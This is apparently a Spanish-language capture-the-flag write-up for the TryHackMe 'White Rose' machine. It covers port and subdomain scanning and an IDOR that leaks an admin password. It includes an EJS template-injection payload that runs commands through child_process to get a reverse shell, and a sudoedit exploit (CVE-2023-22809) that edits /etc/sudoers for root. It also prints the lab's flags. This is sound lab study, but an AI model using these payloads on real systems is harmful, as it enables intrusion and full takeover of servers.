
**primero empezaremos con la fase de escaneo 

**vamos a utilizar la herramienta ==nmap==  

```
nmap -p- --open -Pn -n -sV --min-rate 5000 -sS <HOST> -oN white -vvv
```

**podemos ver que tenemos los puertos ==22/ssh== ==80/http== 

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.39 seconds
           Raw packets sent: 74647 (3.284MB) | Rcvd: 73697 (2.948MB)

```

**a el revisar el puerto 80 podemos ver que tiene un Dominio registramos el dominio en ==/etc/hosts== y podemos ver que nos encontramos con una pagina de mantenimiento 

![[white.png]]

**Ahora buscaremos un subdominante ya que con gobuster no encontramos nada en este dominio  utilizare ==FFUF== para enumerar subdominios

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-  110000.txt -u http://cyprusbank.thm -H "HOST:FUZZ.cyprusbank.thm" -fw 1
```

**y podemos ver que encontramos los dominios 

```
www             
admin              
```

**ahora agregamos los Dominios a el Dominio en ==/etc/hosts==

**bien con el subdominio ==admin==  podemos ver que nos encontramos con la pagina de sesión de el banco![[white2.png]]

**ahora vamos a iniciar sesión con las credenciales que nos da tryhackme de ==Olivia Cortez:olivi8==  una vez dentro a revisar la pagina podemos ver una conversación de usuarios 

![[white3.png]]

**podemos ver que contiene una vulnerabilidad de ==IDOR==  ya que nos permite ver las conversaciones anteriores y a el revisar podemos ver que nos brindan la password de un administrador 
```
user = Gayle Bev | pass = p~]P@5!6;rs558:q
```

**una vez dentro podemos ver que podemos ver el los numeros y a el buscar ya tenemos la primera respuesta 

![[white4.png]]

**bien ahora vamos a buscar una forma de poder conectarnos a la maquina en la parte de cambiar password vamos a interceptarla con burpsuite 

![[white5.png]]

**a el eliminar password me mando un mensaje de error indicandome sobre ==ejs== a el investigar sobre ==SSTI== en ejs podemos encontrar  

```
&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('');//
```

**creamos la reverse-shell en este caso use ==busy==  y la codifique en base64 , mandamos la shell con burpsuite 

![[white7.png]]


**y tenemos conexión con la maquina

![[white8.png]]

**para un shell mas interactivo usaremos 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

stty raw -echo; fg
```

**bien una vez dentro vamos a buscar las flags y empecemos por la primera ==user.txt==

**usaremos el comando ==find== para buscar las flags 

```
find / -name user.txt 2>/dev/null
```

**y nos regresa que se encuentra en la carpeta ==/home/web== 


``THM{4lways_upd4te_uR_d3p3nd3nc!3s}``

**y bien ya tenemos la primera ahora vamos por la segunda flags que se encuentra en ==/root== pero para esta flag necesitamos escalar privilegios 

**a el usar el ``sudo -l`` podemos ver que con sudo nos podemos convertir en root mediante 

```
User web may run the following commands on cyprusbank:
    (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm

```

**hagamos un poco de investigación sobre `sudoedit` , 1. vamos a verificar la versión de sudoedit  podemos ver que tenemos la versión  ==1.9.12p11== bueno a buscar si contiene alguna vulnerabilidad registrada bueno encontramos una `CVE-2023-22809` ahora a explotarla a ver, con ==SUDO_EDITOR== agregamos a sudores a sudoedit 

```
export SUDO_EDITOR='nano -- /etc/sudoers'
sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
```

**luego agregamos el usuario `web` a root 
`
```
web ALL:(ALL:ALL) NOPASSWD: ALL
```

`sudo su` **y listo ya somos root ahora abrimos la flag y ya terminamos la maquina

``THM{4nd_uR_p4ck4g3s}

***con esto culminamos la maquina White Rose
